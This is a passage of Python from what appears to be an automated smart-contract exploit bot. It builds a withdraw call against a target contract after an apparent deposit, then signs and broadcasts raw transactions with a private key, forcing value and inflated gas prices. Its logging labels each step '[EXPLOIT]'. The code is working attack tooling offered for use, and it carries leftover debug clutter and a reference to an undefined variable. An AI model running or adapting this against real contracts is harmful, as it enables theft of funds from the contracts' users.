        print(f"[EXPLOIT] Unknown method '{withdraw_method}', defaulting to withdraw(uint256)", flush=True)
        withdraw_sig = bytes.fromhex("2e1a7d4d")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        data = withdraw_sig + bytes.fromhex(amount_padded)
    
    return _send_tx(w3, account, target, 0, data, nonce + 1)


def _send_tx(w3: Web3, account, to: str, value: int, data: bytes, nonce: int) -> Optional[str]:
    """
    Helper to sign and send transaction with safety checks.
    """
    try:
        value = int(value)

        # Check for Zero and ETH-required methods
        if value == 0 and len(data) >= 4:
            sel = data[:4].hex()
            if sel in ["d0e30db0", "3a4b66f1", "c1cbb378"]: # deposit, stake, contribute
                print(f"[FIX] Value is 0 for method {sel}, forcing 1 wei.", flush=True)
                value = 1

        print(f"DEBUG_TX: to={to}, value={value}, type={type(value)}", flush=True)
        print(f"!!! CRITICAL DEBUG: to={to}, value={value}", flush=True)

        # 1. Force Gas (Legacy Mode)
        gas_limit = 1500000
        try:
            current_gas_price = w3.eth.gas_price
        except:
            current_gas_price = MAX_FEE_PER_GAS
        gas_price = int(current_gas_price * 2)

        tx = {
            "from": account.address,
            "to": to,
            "value": value,
            "data": data,
            "nonce": nonce,
            "gas": gas_limit,
            "gasPrice": gas_price,
            "chainId": w3.eth.chain_id,
            "type": 0
        }
        
        print(f"[EXPLOIT] Signing Raw TX for {to}...", flush=True)
        signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        print(f"[EXPLOIT] Sent TX: {to} | Val: {value} | Hash: {tx_hash.hex()}", flush=True)
        return tx_hash.hex()
        
    except Exception as e:
        gas_dbg = None
        try:
            gas_dbg = gas_limit
        except Exception:
            try:
                gas_dbg = gas_est
            except Exception:
                gas_dbg = None
        print(f"[DEBUG] value={value}, gas={gas_dbg}, price={MAX_FEE_PER_GAS}", flush=True)
        print(f"[EXPLOIT] Simulation/Send failed for {to}: {e}", flush=True)
        return None
